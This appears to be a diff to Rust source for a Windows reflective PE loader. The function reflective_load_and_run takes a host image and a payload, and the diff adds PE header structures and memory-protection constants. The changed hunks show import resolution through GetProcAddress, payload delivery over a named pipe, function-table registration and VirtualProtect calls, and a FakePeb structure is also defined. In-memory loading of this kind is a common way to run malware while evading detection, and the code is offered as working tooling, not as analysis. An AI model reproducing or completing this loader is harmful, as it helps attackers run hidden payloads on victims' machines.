@@ -1,13 +1,18 @@
 #![allow(unsafe_op_in_unsafe_fn)]
 use std::ptr::null_mut;
-use windows_sys::Win32::Foundation::*;
-use windows_sys::Win32::Storage::FileSystem::*;
-use windows_sys::Win32::System::Diagnostics::Debug::*;
-use windows_sys::Win32::System::Environment::*;
-use windows_sys::Win32::System::LibraryLoader::*;
-use windows_sys::Win32::System::Memory::*;
-use windows_sys::Win32::System::Pipes::*;
-use windows_sys::Win32::System::Threading::*;
+use crate::win32::Win32::Foundation::*;
+use crate::win32::Win32::Storage::FileSystem::*;
+use crate::win32::Win32::System::Diagnostics::Debug::*;
+use crate::win32::Win32::System::Environment::*;
+use crate::win32::Win32::System::LibraryLoader::*;
+use crate::win32::Win32::System::Memory::{
+    VirtualAlloc,
+    VirtualProtect,
+    MEM_COMMIT,
+    MEM_RESERVE,
+};
+use crate::win32::Win32::System::Pipes::*;
+use crate::win32::Win32::System::Threading::*;
 
 #[repr(C)]
 pub struct FakePeb {
@@ -41,12 +46,115 @@ pub struct IMAGE_DOS_HEADER {
 }
 
 #[repr(C)]
+pub struct IMAGE_FILE_HEADER {
+    pub Machine: u16,
+    pub NumberOfSections: u16,
+    pub TimeDateStamp: u32,
+    pub PointerToSymbolTable: u32,
+    pub NumberOfSymbols: u32,
+    pub SizeOfOptionalHeader: u16,
+    pub Characteristics: u16,
+}
+
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct IMAGE_DATA_DIRECTORY {
+    pub VirtualAddress: u32,
+    pub Size: u32,
+}
+
+#[repr(C)]
+pub struct IMAGE_OPTIONAL_HEADER64 {
+    pub Magic: u16,
+    pub MajorLinkerVersion: u8,
+    pub MinorLinkerVersion: u8,
+    pub SizeOfCode: u32,
+    pub SizeOfInitializedData: u32,
+    pub SizeOfUninitializedData: u32,
+    pub AddressOfEntryPoint: u32,
+    pub BaseOfCode: u32,
+    pub ImageBase: u64,
+    pub SectionAlignment: u32,
+    pub FileAlignment: u32,
+    pub MajorOperatingSystemVersion: u16,
+    pub MinorOperatingSystemVersion: u16,
+    pub MajorImageVersion: u16,
+    pub MinorImageVersion: u16,
+    pub MajorSubsystemVersion: u16,
+    pub MinorSubsystemVersion: u16,
+    pub Win32VersionValue: u32,
+    pub SizeOfImage: u32,
+    pub SizeOfHeaders: u32,
+    pub CheckSum: u32,
+    pub Subsystem: u16,
+    pub DllCharacteristics: u16,
+    pub SizeOfStackReserve: u64,
+    pub SizeOfStackCommit: u64,
+    pub SizeOfHeapReserve: u64,
+    pub SizeOfHeapCommit: u64,
+    pub LoaderFlags: u32,
+    pub NumberOfRvaAndSizes: u32,
+    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
+}
+
+#[repr(C)]
+pub struct IMAGE_NT_HEADERS64 {
+    pub Signature: u32,
+    pub FileHeader: IMAGE_FILE_HEADER,
+    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
+}
+
+#[repr(C)]
+pub union IMAGE_SECTION_HEADER_MISC {
+    pub PhysicalAddress: u32,
+    pub VirtualSize: u32,
+}
+
+#[repr(C)]
+pub struct IMAGE_SECTION_HEADER {
+    pub Name: [u8; 8],
+    pub Misc: IMAGE_SECTION_HEADER_MISC,
+    pub VirtualAddress: u32,
+    pub SizeOfRawData: u32,
+    pub PointerToRawData: u32,
+    pub PointerToRelocations: u32,
+    pub PointerToLinenumbers: u32,
+    pub NumberOfRelocations: u16,
+    pub NumberOfLinenumbers: u16,
+    pub Characteristics: u32,
+}
+
+#[repr(C)]
 pub struct IMAGE_IMPORT_DESCRIPTOR {
     pub OriginalFirstThunk: u32,
     pub TimeDateStamp: u32,
     pub ForwarderChain: u32,
     pub Name: u32,
     pub FirstThunk: u32,
+}
+
+pub const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
+pub const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
+pub const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
+
+pub const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
+pub const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
+pub const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
+
+pub const PAGE_NOACCESS: u32 = 0x01;
+pub const PAGE_READONLY: u32 = 0x02;
+pub const PAGE_READWRITE: u32 = 0x04;
+pub const PAGE_WRITECOPY: u32 = 0x08;
+pub const PAGE_EXECUTE: u32 = 0x10;
+pub const PAGE_EXECUTE_READ: u32 = 0x20;
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+pub const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
+
+#[repr(C)]
+pub struct IMAGE_RUNTIME_FUNCTION_ENTRY {
+    pub BeginAddress: u32,
+    pub EndAddress: u32,
+    pub UnwindInfoAddress: u32,
 }
 
 pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
@@ -177,11 +285,11 @@ pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
                     GetProcAddress(h_lib, import_name_ptr)
                 };
 
-                if proc_addr.is_none() {
+                if proc_addr.is_null() {
                     std::process::exit(52);
                 }
 
-                *func = proc_addr.unwrap() as u64;
+                *func = proc_addr as u64;
                 thunk = thunk.add(1);
                 func = func.add(1);
             }
@@ -220,7 +328,7 @@ pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
         let h = pipe_handle as HANDLE;
         ConnectNamedPipe(h, null_mut());
         let mut written = 0;
-        WriteFile(h, pl.as_ptr(), pl.len() as u32, &mut written, null_mut());
+        WriteFile(h, pl.as_ptr() as *const _, pl.len() as u32, &mut written, null_mut());
         CloseHandle(h);
     });
 
@@ -352,7 +460,7 @@ pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
             image_base as usize as u64,
         );
         #[cfg(target_arch = "aarch64")]
-        RtlAddFunctionTable(pdata_ptr as *const _, pdata_count, image_base as usize);
+        RtlAddFunctionTable(pdata_ptr as *const _, pdata_count, image_base as usize as u64);
     }
 
     // VirtualProtect
